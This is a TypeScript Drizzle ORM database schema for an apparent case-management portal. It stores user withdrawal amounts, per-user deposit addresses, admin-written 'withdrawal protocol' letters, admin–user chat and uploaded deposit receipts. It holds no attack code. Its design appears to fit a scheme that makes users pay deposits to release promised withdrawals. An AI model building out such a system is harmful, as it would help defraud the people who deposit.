import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, serial, boolean } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const cases = pgTable("cases", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  accessCode: text("access_code").notNull().unique(),
  status: text("status").notNull().default('created'),
  
  // User registration data
  userName: text("user_name"),
  userEmail: text("user_email"),
  userMobile: text("user_mobile"),
  
  // Admin finalization data
  vipStatus: text("vip_status"),
  username: text("username"),
  withdrawalAmount: text("withdrawal_amount"),
  withdrawalBatches: text("withdrawal_batches"),
  physilocal0: text("physilocal0"),
  
  // Per-user deposit and profile settings
  depositAddress: text("deposit_address"),
  profileRedirectUrl: text("profile_redirect_url"),
  hasRequirements: boolean("has_requirements").default(false),
  
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseSchema = createInsertSchema(cases).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const updateCaseSchema = insertCaseSchema.partial();

export type InsertCase = z.infer<typeof insertCaseSchema>;
export type UpdateCase = z.infer<typeof updateCaseSchema>;
export type Case = typeof cases.$inferSelect;

// Custom letter content per case
export const caseLetters = pgTable("case_letters", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  
  // Letter sections that admin can customize
  headline: text("headline").default("Withdrawal Protocol Selection"),
  introduction: text("introduction"),
  bodyContent: text("body_content"),
  footerNote: text("footer_note"),
  
  // Option A customization
  optionATitle: text("option_a_title").default("Accelerated Release"),
  optionADescription: text("option_a_description"),
  optionAAmount: text("option_a_amount"),
  optionABatches: text("option_a_batches"),
  optionATotalAmount: text("option_a_total_amount"),
  optionAFilelocoId: text("option_a_fileloco_id"),
  
  // Option B customization
  optionBTitle: text("option_b_title").default("Standard Release"),
  optionBDescription: text("option_b_description"),
  optionBAmount: text("option_b_amount"),
  optionBBatches: text("option_b_batches"),
  optionBTotalAmount: text("option_b_total_amount"),
  optionBFilelocoId: text("option_b_fileloco_id"),
  
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseLetterSchema = createInsertSchema(caseLetters).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const updateCaseLetterSchema = insertCaseLetterSchema.partial();

export type InsertCaseLetter = z.infer<typeof insertCaseLetterSchema>;
export type UpdateCaseLetter = z.infer<typeof updateCaseLetterSchema>;
export type CaseLetter = typeof caseLetters.$inferSelect;

// Submission history
export const caseSubmissions = pgTable("case_submissions", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  
  selectedOption: text("selected_option").notNull(),
  notes: text("notes"),
  
  // Snapshot of user info at submission time
  userName: text("user_name"),
  userEmail: text("user_email"),
  
  // Snapshot of withdrawal details at submission time
  withdrawalAmount: text("withdrawal_amount"),
  withdrawalBatches: text("withdrawal_batches"),
  
  submittedAt: timestamp("submitted_at").notNull().default(sql`now()`),
});

export const insertCaseSubmissionSchema = createInsertSchema(caseSubmissions).omit({
  id: true,
  submittedAt: true,
});

export type InsertCaseSubmission = z.infer<typeof insertCaseSubmissionSchema>;
export type CaseSubmission = typeof caseSubmissions.$inferSelect;

// Chat messages between admin and user
export const chatMessages = pgTable("chat_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  sender: text("sender").notNull(), // 'admin' or 'user'
  message: text("message").notNull(),
  isRead: text("is_read").default('false'),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertChatMessageSchema = createInsertSchema(chatMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertChatMessage = z.infer<typeof insertChatMessageSchema>;
export type ChatMessage = typeof chatMessages.$inferSelect;

// Admin messages with categories (Urgent/Processing/Resolved)
export const adminMessages = pgTable("admin_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  category: text("category").notNull().default('processing'), // 'urgent', 'processing', 'resolved'
  title: text("title").notNull(),
  body: text("body").notNull(),
  isRead: boolean("is_read").default(false),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertAdminMessageSchema = createInsertSchema(adminMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertAdminMessage = z.infer<typeof insertAdminMessageSchema>;
export type AdminMessage = typeof adminMessages.$inferSelect;

// Deposit receipts uploaded by users
export const depositReceipts = pgTable("deposit_receipts", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  submissionId: serial("submission_id"),
  imageData: text("image_data"), // Base64 encoded image
  fileName: text("file_name"),
  notes: text("notes"),
  status: text("status").default('pending'), // 'pending', 'reviewed', 'approved', 'rejected'
  adminNotes: text("admin_notes"), // Admin feedback/notes on the receipt
  uploadedAt: timestamp("uploaded_at").notNull().default(sql`now()`),
});

export const insertDepositReceiptSchema = createInsertSchema(depositReceipts).omit({
  id: true,
  uploadedAt: true,
});

export type InsertDepositReceipt = z.infer<typeof insertDepositReceiptSchema>;
export type DepositReceipt = typeof depositReceipts.$inferSelect;
